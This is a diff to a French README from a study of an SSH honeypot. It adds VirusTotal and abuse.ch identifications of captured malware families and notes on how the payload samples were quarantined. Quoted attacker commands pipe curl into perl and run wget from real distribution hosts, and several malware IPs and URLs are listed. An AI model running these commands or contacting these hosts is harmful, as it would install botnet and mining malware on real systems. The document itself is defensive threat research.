@@ -5,7 +5,7 @@
 *English version: [README.md](README.md)*
 
 > [!NOTE]
-> **Mis à jour le 4 octobre 2026.** La première version comptait des *sessions*, qui sont en réalité des canaux SSH : les bots envoient chaque commande dans son propre canal, si bien qu'une seule connexion produit en moyenne environ treize « sessions ». Tous les chiffres qui utilisaient la session comme unité sont désormais calculés par **connexion réussie qui exécute des commandes** (993). Cela change une conclusion — la Chine est le **premier** pays par connexions qui exécutent des commandes, pas le septième — et supprime un artefact : le `exit` présenté comme la commande la plus tapée était ajouté par le honeypot lui-même après chaque commande. Deux commandes citées dans la partie sur la concurrence (`iptables -F`, `multics.x64`) provenaient en réalité du contenu d'un fichier envoyé par `scp`, pas de commandes exécutées ; elles sont retirées. Les chiffres d'authentification sont inchangés. Ajouts depuis la publication : [la chasse aux données](#la-chasse-aux-données--ou-plutôt-au-rebond-suivant), l'identification des payloads via abuse.ch, et les [angles morts](#angles-morts).
+> **Mis à jour le 4 octobre 2026.** La première version comptait des *sessions*, qui sont en réalité des canaux SSH : les bots envoient chaque commande dans son propre canal, si bien qu'une seule connexion produit en moyenne environ treize « sessions ». Tous les chiffres qui utilisaient la session comme unité sont désormais calculés par **connexion réussie qui exécute des commandes** (993). Cela change une conclusion — la Chine est le **premier** pays par connexions qui exécutent des commandes, pas le septième — et supprime un artefact : le `exit` présenté comme la commande la plus tapée était ajouté par le honeypot lui-même après chaque commande. Deux commandes citées dans la partie sur la concurrence (`iptables -F`, `multics.x64`) provenaient en réalité du contenu d'un fichier envoyé par `scp`, pas de commandes exécutées ; elles sont retirées. Les chiffres d'authentification sont inchangés. Ajouts depuis la publication : [la chasse aux données](#la-chasse-aux-données--ou-plutôt-au-rebond-suivant), l'identification des payloads via abuse.ch et VirusTotal, et les [angles morts](#angles-morts).
 
 ---
 
@@ -795,7 +795,7 @@ pkill kswpad
 
 Le dépôt dans `/etc` plutôt que `/tmp` est délibéré : `/tmp` est souvent monté en `noexec` et purgé au redémarrage, `/etc` ne l'est jamais. La rotation de ports (3594 → 26346, 35415 → 62123) est une évasion de blocage basique.
 
-URLhaus identifie `kal64` et `kswpad` comme **BillGates / Elknot**, un bot DDoS Linux. L'infrastructure ne lui est d'ailleurs pas réservée : ThreatFox recense `151.241.154.172` comme serveur de commande **Remcos** (un RAT Windows), et `195.177.94.72` a aussi servi des payloads Windows, étiquetés `exe`, `msi` et `connectwise`.
+URLhaus identifie `kal64` et `kswpad` comme **BillGates / Elknot**, un bot DDoS Linux, et VirusTotal confirme (Setag et Ganiw sont d'autres noms de la même famille). VirusTotal identifie aussi les deux autres binaires : `amd64` est **Kaiji**, un autre bot DDoS, écrit en Go, et `/b/linux` est un **scanner SSH** — l'outil qui trouve les victimes suivantes. L'infrastructure ne lui est d'ailleurs pas réservée : ThreatFox recense `151.241.154.172` comme serveur de commande **Remcos** (un RAT Windows), et `195.177.94.72` a aussi servi des payloads Windows, étiquetés `exe`, `msi` et `connectwise`.
 
 ### Famille « /linux » — un binaire, beaucoup d'hôtes
 
@@ -821,7 +821,7 @@ Le même schéma d'URL sur 15 hôtes différents, majoritairement des IP Alibaba
 
 Chaque hôte utilise un port haut différent. L'infrastructure est jetable : chaque IP ne sert que quelques connexions avant d'être remplacée.
 
-URLhaus confirme le « un seul binaire » : le même fichier (SHA-256 `a505de0a…`) a été collecté sur 7 de ces hôtes. Deux hôtes de la famille sont étiquetés **P2Pinfect**, un ver écrit en Rust qui se propage via Redis et SSH et embarque un mineur — une identification probable, mais indirecte.
+URLhaus confirme le « un seul binaire » : le même fichier (SHA-256 `a505de0a…`) a été collecté sur 7 de ces hôtes. Deux hôtes de la famille sont étiquetés **P2Pinfect**, un ver écrit en Rust qui se propage via Redis et SSH et embarque un mineur — une identification probable, mais indirecte. VirusTotal ne tranche pas : 34 moteurs sur 62 détectent le binaire commun, mais seulement avec des étiquettes génériques (cheval de Troie compressé, rootkit) ; le nom P2Pinfect n'apparaît que sur des échantillons plus anciens de `47.86.176.209`.
 
 ### Famille « zed » — bot IRC en Perl
 
@@ -838,13 +838,13 @@ timeout 60 curl -sS http://154.70.152.216/zed | perl >/dev/null 2>&1 &
 
 Le pipe `curl | perl` est notable : **rien n'est écrit sur disque**. Le script s'exécute directement en mémoire, ce qui le rend invisible à un antivirus basé sur l'analyse de fichiers. Le `nohup … </dev/null &` avec triple redirection garantit la survie à la fermeture de la session SSH.
 
-URLhaus a collecté **15 scripts Perl différents** sur `154.70.152.216/zed` : le contenu change d'un téléchargement à l'autre, l'URL reste la même.
+URLhaus a collecté **15 scripts Perl différents** sur `154.70.152.216/zed` : le contenu change d'un téléchargement à l'autre, l'URL reste la même. VirusTotal classe tous ceux qu'il connaît — 8 sur 15, plus le script de `66.116.243.130` — comme **Shellbot**, le bot IRC en Perl associé à Outlaw.
 
 ### Autres
 
 | Hôte | Pays | URL | Note |
 |---|---|---|---|
-| `45.153.34.212` | 🇳🇱 Pays-Bas | `45.153.34.212/fakepika`, `:8181/.bia`, `:8181/.dcplm` | attribué par ThreatFox à **Diicot**, un groupe roumanophone : dropper Mirai et proxy de minage XMRig ; fichiers à point pour se cacher d'un `ls` |
+| `45.153.34.212` | 🇳🇱 Pays-Bas | `45.153.34.212/fakepika`, `:8181/.bia`, `:8181/.dcplm` | attribué par ThreatFox à **Diicot**, un groupe roumanophone : dropper Mirai et proxy de minage XMRig. `.bia` et `.dcplm` sont des scripts shell que VirusTotal classe comme téléchargeurs installant un mineur. Fichiers à point pour se cacher d'un `ls` |
 | `64.89.161.144` | 🇺🇸 États-Unis | `:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG` | mineur **XMRig** selon URLhaus ; chemin aléatoire — anti-signature d'URL |
 | `31.56.209.39` | 🇳🇱 Pays-Bas | `/wget.sh`, `/curl.sh` | **Mirai** selon URLhaus ; double dropper selon l'outil disponible |
 
@@ -866,11 +866,11 @@ echo "history -cw; cd /tmp; rm -rf *.sh; rm -rf bizy*; rm -rf odin*; wget http:/
 
 ### Recoupement avec le renseignement public
 
-Après l'étude, j'ai recherché chaque URL et chaque hôte dans les bases d'[abuse.ch](https://abuse.ch/) (URLhaus, ThreatFox, MalwareBazaar). Uniquement des métadonnées : rien n'a été téléchargé.
+Après l'étude, j'ai recherché chaque URL et chaque hôte dans les bases d'[abuse.ch](https://abuse.ch/) (URLhaus, ThreatFox, MalwareBazaar), puis chaque hash de payload collecté par URLhaus sur VirusTotal (35 hashes, 28 connus). Le 4 octobre, les payloads encore en ligne — le binaire `/linux` commun et un script `zed` — ont été téléchargés dans une quarantaine en lecture seule, hachés, et jamais exécutés : les deux étaient déjà connus de VirusTotal, donc rien n'a eu besoin d'être envoyé.
 
-- **Couverture** : 23 des 46 URLs et 14 des 24 hôtes étaient déjà connus. Les 10 autres hôtes — surtout de la famille `/linux`, plus `66.116.243.130` — n'apparaissent dans aucune des trois bases.
-- **Familles** : toutes les familles identifiées sont soit des mineurs (XMRig, P2Pinfect), soit des bots DDoS (BillGates, Mirai). Aucune n'est un voleur d'informations — ce qui rejoint ce que suggéraient les commandes de recon : la cible, ce sont les ressources de la machine, pas son contenu.
-- **Réserve** : ce sont des étiquettes de tiers, pas ma propre analyse des binaires.
+- **Couverture** : 23 des 46 URLs et 14 des 24 hôtes étaient déjà connus d'URLhaus. Les 10 autres hôtes sont surtout de la famille `/linux`, plus `66.116.243.130` et `45.153.34.212` (ce dernier connu de ThreatFox). Le 4 octobre, j'ai soumis à URLhaus les quatre URLs de ces hôtes qui servaient encore des fichiers.
+- **Familles** : toutes les familles identifiées sont des mineurs (XMRig, P2Pinfect), des bots DDoS (BillGates, Kaiji, Mirai), un bot IRC (Shellbot) ou des outils de propagation (scanner SSH, installeurs de mineur). Aucune n'est un voleur d'informations — ce qui rejoint ce que suggéraient les commandes de recon : la cible, ce sont les ressources de la machine, pas son contenu.
+- **Réserve** : ce sont des étiquettes de tiers, pas ma propre analyse des binaires. Les étiquettes antivirus sont souvent génériques, comme le montre le binaire `/linux`.
 
 ### Synthèse géographique de l'infrastructure de distribution
 
@@ -940,6 +940,6 @@ L'architecture qui rend ce honeypot sûr conditionne aussi ce qu'il peut voir. Q
 - **Données** : base SQLite du honeypot, du 28/04/2026 au 21/09/2026. Les commandes ont été reconstruites à partir des flux d'entrée (`"i"`) des enregistrements asciinema v2, et non depuis un historique shell — donc rien n'échappe à un `history -c`.
 - **Connexions** : la base stocke une ligne par canal SSH (« session »), sans identifiant de connexion. Les connexions ont été reconstituées en rattachant chaque session à la connexion réussie qui la précède, depuis la même IP. Les chiffres par connexion utilisent la même extraction que les chiffres d'authentification (21 septembre, 11 h 35 UTC) et en reproduisent exactement les totaux : 1 656 connexions réussies, 12 939 sessions. Les sessions sont rattachées à la dernière connexion réussie depuis la même IP. Quand plusieurs connexions partagent la même seconde, leurs sessions ne peuvent pas être réparties : c'est le cas 5 fois, principalement pour une IP qui a ouvert 32 connexions dans la même seconde le 11 juin et exécuté 79 commandes en 4 secondes. Chaque cas compte pour une connexion ; les commandes répétées suggèrent que 4 à 6 de ces 32 connexions ont réellement exécuté quelque chose, si bien que les décomptes de connexions peuvent être sous-estimés de quelques unités.
 - **Géolocalisation** : base MaxMind GeoLite2-Country, interrogée **localement**. Aucune adresse IP n'a été transmise à un service tiers.
-- **Payloads** : aucun binaire ni script n'a été téléchargé, analysé dynamiquement ou exécuté. La microVM est dépourvue d'interface réseau ; toutes les tentatives de téléchargement ont échoué au niveau socket. Les URLs publiées proviennent exclusivement de la lecture des frappes clavier. Le 03/10/2026, les URLs et les hôtes de distribution ont été recherchés dans les bases d'abuse.ch (URLhaus, ThreatFox, MalwareBazaar) ; ce sont les seules données transmises à un tiers, et ce sont des indicateurs déjà publiés ici.
+- **Payloads** : pendant l'étude, aucun binaire ni script n'a été téléchargé, analysé dynamiquement ou exécuté. La microVM est dépourvue d'interface réseau ; toutes les tentatives de téléchargement ont échoué au niveau socket. Les URLs publiées proviennent exclusivement de la lecture des frappes clavier. Le 03/10/2026, les URLs et les hôtes de distribution ont été recherchés dans les bases d'abuse.ch (URLhaus, ThreatFox, MalwareBazaar) ; le 04/10/2026, les hashes des payloads ont été recherchés sur VirusTotal, et les deux payloads encore en ligne ont été téléchargés dans une quarantaine en lecture seule pour vérifier leur hash — jamais exécutés. Ces recherches sont les seules données transmises à un tiers, et ce sont des indicateurs déjà publiés ici.
 - **Vie privée** : les adresses IP publiées sont celles de machines ayant activement attaqué un système tiers, et celles d'infrastructures de distribution de malware. Elles sont diffusées comme indicateurs de compromission.
 - **Attribution** : aucune. La géolocalisation IP décrit l'emplacement d'une infrastructure, pas l'identité ou la nationalité d'un opérateur.
